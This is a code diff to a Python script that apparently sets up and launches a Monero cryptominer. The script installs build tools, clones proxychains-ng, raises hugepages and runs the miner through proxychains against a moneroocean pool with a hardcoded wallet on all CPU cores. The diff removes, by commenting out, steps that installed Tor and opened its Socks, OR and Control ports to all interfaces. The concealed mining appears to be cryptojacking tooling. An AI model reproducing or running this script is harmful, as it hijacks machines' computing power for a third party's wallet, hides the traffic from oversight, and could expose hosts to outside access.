@@ -19,7 +19,7 @@ os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
 
 try:
     os.system('apt-get update -y')
-    os.system('apt-get install gcc make tor python python-dev -y')
+    os.system('apt-get install gcc make python python-dev -y')
     os.system('rm -rf proxychains-ng')
     os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
     os.chdir('proxychains-ng')
@@ -36,11 +36,13 @@ try:
 except:
     pass
 
-# Edit Tor configuration to bind to 0.0.0.0
-os.system("sed -i 's/^SocksPort 127.0.0.1/SocksPort 0.0.0.0/' /etc/tor/torrc")
-os.system("sed -i 's/^ORPort 127.0.0.1/ORPort 0.0.0.0/' /etc/tor/torrc")
-os.system("sed -i 's/^ControlPort 127.0.0.1/ControlPort 0.0.0.0/' /etc/tor/torrc")
+# Removed Tor configuration
+# os.system("sed -i 's/^SocksPort 127.0.0.1/SocksPort 0.0.0.0/' /etc/tor/torrc")
+# os.system("sed -i 's/^ORPort 127.0.0.1/ORPort 0.0.0.0/' /etc/tor/torrc")
+# os.system("sed -i 's/^ControlPort 127.0.0.1/ControlPort 0.0.0.0/' /etc/tor/torrc")
 
-os.system('tor &')
-time.sleep(60)
+# Removed Tor execution
+# os.system('tor &')
+# time.sleep(60)
+
 os.system('proxychains4 ' + program + ' --donate-level 1 -o gulf.moneroocean.stream:10128 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p db -a rx/0 -k --tls -t ' + str(cores))
